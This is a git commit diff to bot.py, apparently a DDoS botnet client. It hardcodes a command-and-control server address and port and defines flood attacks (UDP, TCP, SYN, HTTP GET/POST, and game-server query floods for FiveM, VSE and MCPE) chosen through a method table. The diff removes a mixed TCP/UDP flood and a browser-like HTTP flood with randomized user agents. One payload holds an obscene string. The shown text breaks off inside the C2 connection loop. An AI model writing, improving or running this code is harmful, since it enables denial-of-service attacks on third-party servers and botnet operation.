da7fea08b59cd988e261a87d63b0b51f0c477a8a
anaslmzbeb <rayanjames853@gmail.com>
2025-04-14 10:45:53 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,15 +1,14 @@
 import socket
 import threading
 import time
-import os
 import random
+import os
 
 # Configuration
 C2_ADDRESS  = "134.255.234.140"
 C2_PORT     = 6666
 
-
-# Payloads
+# Payloads (example, replace with actual payloads)
 payload_fivem = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
 payload_vse = b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'
 payload_mcpe = b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c\x73'
@@ -17,21 +16,11 @@ payload_hex = b'\x55\x55\x55\x55\x00\x00\x00\x01'
 
 PACKET_SIZES = [512, 1024, 2048]
 
-base_user_agents = [
-    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
-    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
-    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
-    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
-    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/537.36"
-]
-
+# Function to generate random user agent
 def rand_ua():
-    return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())
+    return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
 
-# Bot Functions
+# Bot functions
 def attack_fivem(ip, port, secs):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     while time.time() < secs:
@@ -63,7 +52,6 @@ def attack_tcp_bypass(ip, port, secs):
     while time.time() < secs:
         packet_size = random.choice(PACKET_SIZES)
         packet = random._urandom(packet_size)
-
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((ip, port))
@@ -74,32 +62,9 @@ def attack_tcp_bypass(ip, port, secs):
         finally:
             s.close()
 
-def attack_tcp_udp_bypass(ip, port, secs):
-    while time.time() < secs:
-        try:
-            packet_size = random.choice(PACKET_SIZES)
-            packet = random._urandom(packet_size)
-
-            if random.choice([True, False]):  # Alterna entre TCP e UDP
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((ip, port))
-            else:
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
-            while time.time() < secs:
-                if s.type == socket.SOCK_STREAM:
-                    s.send(packet)
-                else:
-                    s.sendto(packet, (ip, port))
-        except Exception as e:
-            pass
-        finally:
-            s.close()
-
 def attack_syn(ip, port, secs):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setblocking(0)
-
     try:
         s.connect((ip, port))
         while time.time() < secs:
@@ -137,48 +102,26 @@ def attack_http_post(ip, port, secs):
         except:
             s.close()
 
-def attack_browser(ip, port, secs):
-    while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(5)
-        try:
-            s.connect((ip, port))
-            request = (f'GET / HTTP/1.1\r\n'
-                       f'Host: {ip}\r\n'
-                       f'User-Agent: {rand_ua()}\r\n'
-                       f'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n'
-                       f'Accept-Encoding: gzip, deflate, br\r\n'
-                       f'Accept-Language: en-US,en;q=0.5\r\n'
-                       f'Connection: keep-alive\r\n'
-                       f'Upgrade-Insecure-Requests: 1\r\n'
-                       f'Cache-Control: max-age=0\r\n'
-                       f'Pragma: no-cache\r\n\r\n')
-            s.sendall(request.encode())
-        except Exception as e:
-            pass
-        finally:
-            s.close()
-
+# Method Selector
 def lunch_attack(method, ip, port, secs):
     methods = {
         '.HEX': attack_hex,
         '.UDP': attack_udp_bypass,
         '.TCP': attack_tcp_bypass,
-        '.MIX': attack_tcp_udp_bypass,
         '.SYN': attack_syn,
         '.VSE': attack_vse,
         '.MCPE': attack_mcpe,
         '.FIVEM': attack_fivem,
         '.HTTPGET': attack_http_get,
         '.HTTPPOST': attack_http_post,
-        '.BROWSER': attack_browser,
     }
     methods[method](ip, port, secs)
 
-# Main bot logic function
+# Bot Connection and Command Processing
 def run_bot():
     c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+    c2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    c2.setblocking(False)
 
     while 1:
         try:
